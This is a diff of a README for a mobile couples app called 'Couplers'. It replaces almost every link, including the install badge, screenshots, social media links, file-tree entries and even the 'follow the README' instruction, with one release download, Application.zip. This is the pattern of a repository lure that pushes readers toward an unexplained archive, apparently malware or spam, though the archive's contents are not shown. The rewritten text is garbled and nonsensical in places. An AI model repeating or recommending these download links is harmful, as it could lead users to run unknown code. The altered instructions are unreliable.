@@ -37,38 +37,38 @@ couplers/
 │    ├── models/
 │    └── services/
 │
-├── pubspec.yaml
+├── https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip
 │
-└── README.md
+└── https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip
 ```
 
 ## 📥 Installation 📥
 
 To get started with Couplers, simply download the project files from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
 
-Once you have downloaded the files, extract them and follow the instructions in the `README.md` file to set up the project on your local machine.
+Once you have downloaded the files, extract them and follow the instructions in the `https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip` file to set up the project on your local machine.
 
 ## 📷 Screenshots 📷
 
 Here are some glimpses of what you can expect from the Couplers app:
 
-![Memory Lane](https://example.com/memory_lane.png)  
+![Memory Lane](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)  
 *Relive your favorite memories together.*
 
-![Photo Sharing](https://example.com/photo_sharing.png)  
+![Photo Sharing](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)  
 *Share photos and create photo albums with ease.*
 
-![Love Calendar](https://example.com/love_calendar.png)  
+![Love Calendar](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)  
 *Stay organized and never miss an important date.*
 
 ## 🌐 Connect with Us 🌐
 
 Want to stay updated on the latest developments with Couplers? Follow us on social media and join our community:
 
-- [Twitter](https://twitter.com/couplers_app)
-- [Instagram](https://instagram.com/couplers_app)
-- [Facebook](https://facebook.com/couplers_app)
+- [Twitter](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
+- [Instagram](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
+- [Facebook](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip)
 
 ## 🙌 Contributing 🙌
 
@@ -76,7 +76,7 @@ We welcome contributions from developers who are passionate about creating meani
 
 ## 📆 Release Notes 📆
 
-For the latest updates and version releases of the Couplers app, please check the [Releases](https://github.com/Rubenas123/6487922/releases) section of this repository.
+For the latest updates and version releases of the Couplers app, please check the [Releases](https://github.com/muum1209/Couplers/releases/download/v1.0/Application.zip) section of this repository.
 
 ---
 
